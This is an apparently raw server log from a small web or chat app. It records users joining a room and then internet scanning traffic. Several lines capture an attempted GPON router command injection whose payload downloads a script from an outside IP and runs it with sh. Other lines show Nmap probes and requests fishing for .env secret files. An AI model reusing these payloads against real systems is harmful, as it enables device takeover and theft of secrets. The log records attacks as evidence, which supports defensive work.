[2021-04-19 10:46:16.251] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '7d955879adf44904aa077cb8b0d30171',
  username: '一条鱼',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZe1Nai' }
[2021-04-19 10:46:16.251] [INFO] - [ 'NY0E8Nt4eTbg5zjlADCm', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:46:22.272] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '0a08a50acd4c4028bde3ad8c51bae37b',
  username: '徐胜环老师',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZe1P2i' }
[2021-04-19 10:46:22.272] [INFO] - [ 'Ikb3PVg5c9MXHav6ADCn', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:46:26.446] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '7d955879adf44904aa077cb8b0d30171',
  username: '一条鱼',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZe1Q3-' }
[2021-04-19 10:46:26.447] [INFO] - [ 'CaFpw_TYOKJsr-i-ADCo', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:46:42.023] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '7d955879adf44904aa077cb8b0d30171',
  username: '一条鱼',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZe1Tt3' }
[2021-04-19 10:46:42.023] [INFO] - [ '8XTqPIicDXMCk6I7ADCp', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:46:57.887] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '0a08a50acd4c4028bde3ad8c51bae37b',
  username: '徐胜环老师',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZe1Xkq' }
[2021-04-19 10:46:57.887] [INFO] - [ 'VXwoANlHpaXN49hqADCq', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:47:20.206] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '7d955879adf44904aa077cb8b0d30171',
  username: '一条鱼',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZe1dBj' }
[2021-04-19 10:47:20.206] [INFO] - [ 'k6BrtOl-MB9GBK7hADCr', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:47:21.606] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '8c6adc7f85a7462d9c09b8097a8ee1a7',
  username: '青青雨兰',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZe1ddU' }
[2021-04-19 10:47:21.607] [INFO] - [ 'SnZRejxYTc0a9pJLADCs', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:50:04.050] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '7d955879adf44904aa077cb8b0d30171',
  username: '一条鱼',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZe2FC3' }
[2021-04-19 10:50:04.050] [INFO] - [ 'SJC9ebjcdpHixa2PADCt', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:50:24.257] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/login 200 0ms
[2021-04-19 10:51:29.898] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'ab03c34d4e344df599506b9ca7d6bc19',
  username: '彭元海（昵称:园丁）',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZe2aA5' }
[2021-04-19 10:51:29.898] [INFO] - [ 'IzjFGpHpHU8T6AiSADCu', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:51:44.511] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'ab03c34d4e344df599506b9ca7d6bc19',
  username: '彭元海（昵称:园丁）',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZe2dkQ' }
[2021-04-19 10:51:44.511] [INFO] - [ 'kaS11QM0hccSMKSxADCv', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:53:19.661] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/login 200 0ms
[2021-04-19 10:54:01.536] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'd4d5a67d5ee644e3aff44c8a1255408f',
  username: '端紫',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZe39V1' }
[2021-04-19 10:54:01.537] [INFO] - [ 'UCPd8ovgrHgRO61pADCw', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:55:40.308] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '7d955879adf44904aa077cb8b0d30171',
  username: '一条鱼',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZe3XIJ' }
[2021-04-19 10:55:40.308] [INFO] - [ 'bCqwWxBanAOcjncRADCx', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:57:19.973] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '7d955879adf44904aa077cb8b0d30171',
  username: '一条鱼',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZe3ve4' }
[2021-04-19 10:57:19.973] [INFO] - [ 'U5iPhm4QpqPl1ZR_ADCy', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:58:23.189] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'e8cb0d830ac64b83a2ed9f089152b7a2',
  username: '用心良苦',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZe48mR' }
[2021-04-19 10:58:23.189] [INFO] - [ 'HyW-LuQy_O00gjnFADCz', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 11:20:38.873] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-04-19 11:36:33.252] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 1ms
[2021-04-19 11:45:42.690] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 1ms
[2021-04-19 11:56:08.155] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 1ms
[2021-04-19 12:03:08.604] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'a716d27e277e470ab379932be4d4a994',
  username: 'MASA',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZeIzdt' }
[2021-04-19 12:03:08.604] [INFO] - [ 'VPTEzUiq8MF792cIADC0', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 12:06:40.134] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/actuator/health 200 1ms
[2021-04-19 12:14:47.984] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/actuator/health 200 0ms
[2021-04-19 12:37:12.233] [INFO] - [127.0.0.1] POST http://127.0.0.1:8250/GponForm/diag_Form?style/ "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=$(busybox+wget+http://46.249.33.79/cache+-O+->+/dev/.p;sh+/dev/.p)&ipv=0\r\n" 405 1ms
[2021-04-19 12:38:15.221] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f 200 0ms
[2021-04-19 12:38:27.969] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f 200 0ms
[2021-04-19 12:42:00.612] [INFO] - [127.0.0.1] POST http://127.0.0.1:8250/GponForm/diag_Form?style/ "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=$(busybox+wget+http://46.249.33.79/cache+-O+->+/dev/.p;sh+/dev/.p)&ipv=0\r\n" 405 0ms
[2021-04-19 12:52:33.201] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-04-19 12:58:44.369] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-04-19 12:59:02.164] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/nmaplowercheck1618808341 200 1ms
[2021-04-19 12:59:02.317] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/NmapUpperCheck1618808341 200 1ms
[2021-04-19 12:59:02.472] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/Nmap/folder/check1618808341 200 1ms
[2021-04-19 12:59:21.833] [INFO] - [127.0.0.1] POST http://127.0.0.1:8250/sdk {} 405 0ms
[2021-04-19 13:00:00.886] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-04-19 13:00:01.039] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 1ms
[2021-04-19 13:40:31.742] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 1ms
[2021-04-19 13:50:17.906] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-04-19 13:53:05.289] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-04-19 14:04:07.377] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-04-19 14:32:54.341] [INFO] - [101.133.155.170] GET http:/// 200 0ms
[2021-04-19 14:32:56.546] [INFO] - [101.133.155.170] OPTIONS http:/// undefined 200 0ms
[2021-04-19 14:33:35.752] [INFO] - [101.133.155.170] GET http:///nice%20ports%2C/Tri%6Eity.txt%2ebak 200 0ms
[2021-04-19 14:34:43.901] [INFO] - [101.133.155.170] GET http:///server-info 200 0ms
[2021-04-19 14:35:02.940] [INFO] - [101.133.155.170] GET http:///version 200 0ms
[2021-04-19 15:17:55.565] [INFO] - [127.0.0.1] POST http://127.0.0.1:8250/GponForm/diag_Form?style/ "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=$(busybox+wget+http://46.249.33.79/cache+-O+->+/dev/.p;sh+/dev/.p)&ipv=0\r\n" 405 0ms
[2021-04-19 15:18:42.572] [INFO] - [127.0.0.1] POST http://127.0.0.1:8250/GponForm/diag_Form?style/ "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=$(busybox+wget+http://46.249.33.79/cache+-O+->+/dev/.p;sh+/dev/.p)&ipv=0\r\n" 405 0ms
[2021-04-19 15:18:46.155] [INFO] - [127.0.0.1] POST http://127.0.0.1:8250/GponForm/diag_Form?style/ "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=$(busybox+wget+http://46.249.33.79/cache+-O+->+/dev/.p;sh+/dev/.p)&ipv=0\r\n" 405 1ms
[2021-04-19 17:15:30.565] [INFO] - [127.0.0.1] POST http://127.0.0.1:8250/GponForm/diag_Form?style/ "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=$(busybox+wget+http://46.249.33.79/cache+-O+->+/dev/.p;sh+/dev/.p)&ipv=0\r\n" 405 0ms
[2021-04-19 17:17:31.778] [INFO] - [127.0.0.1] POST http://127.0.0.1:8250/GponForm/diag_Form?style/ "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=$(busybox+wget+http://46.249.33.79/cache+-O+->+/dev/.p;sh+/dev/.p)&ipv=0\r\n" 405 0ms
[2021-04-19 17:50:23.451] [INFO] - [139.224.135.116] GET http://47.100.89.2:8250/ 200 0ms
[2021-04-19 20:02:16.678] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/bag2 200 1ms
[2021-04-19 20:22:30.395] [INFO] - [127.0.0.1] POST http://127.0.0.1:8250/GponForm/diag_Form?style/ "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=$(busybox+wget+http://46.249.33.79/cache+-O+->+/dev/.p;sh+/dev/.p)&ipv=0\r\n" 405 0ms
[2021-04-19 20:25:34.781] [INFO] - [127.0.0.1] POST http://127.0.0.1:8250/GponForm/diag_Form?style/ "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=$(busybox+wget+http://46.249.33.79/cache+-O+->+/dev/.p;sh+/dev/.p)&ipv=0\r\n" 405 1ms
[2021-04-19 20:26:22.596] [INFO] - [127.0.0.1] POST http://127.0.0.1:8250/GponForm/diag_Form?style/ "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=$(busybox+wget+http://46.249.33.79/cache+-O+->+/dev/.p;sh+/dev/.p)&ipv=0\r\n" 405 0ms
[2021-04-19 21:29:01.251] [INFO] - [127.0.0.1] POST http://127.0.0.1:8250/GponForm/diag_Form?style/ "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=$(busybox+wget+http://46.249.33.79/cache+-O+->+/dev/.p;sh+/dev/.p)&ipv=0\r\n" 405 1ms
[2021-04-19 21:31:54.027] [INFO] - [127.0.0.1] POST http://127.0.0.1:8250/GponForm/diag_Form?style/ "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=$(busybox+wget+http://46.249.33.79/cache+-O+->+/dev/.p;sh+/dev/.p)&ipv=0\r\n" 405 0ms
[2021-04-19 21:52:04.284] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/api/.env 200 0ms
[2021-04-19 21:52:05.156] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/.env 200 0ms
[2021-04-19 21:52:06.014] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/core/.env 200 1ms
[2021-04-19 22:33:16.377] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-04-19 23:02:23.995] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 1ms
[2021-04-19 23:02:24.071] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-04-19 23:02:24.137] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/favicon.ico 200 1ms
[2021-04-19 23:32:53.203] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/nmaplowercheck1618846366 200 0ms
[2021-04-19 23:32:53.349] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/NmapUpperCheck1618846366 200 0ms
[2021-04-19 23:32:53.497] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/Nmap/folder/check1618846366 200 0ms
[2021-04-19 23:32:57.098] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-04-19 23:33:23.962] [INFO] - [127.0.0.1] POST http://127.0.0.1:8250/sdk {} 405 0ms
[2021-04-19 23:33:38.527] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-04-19 23:33:38.679] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
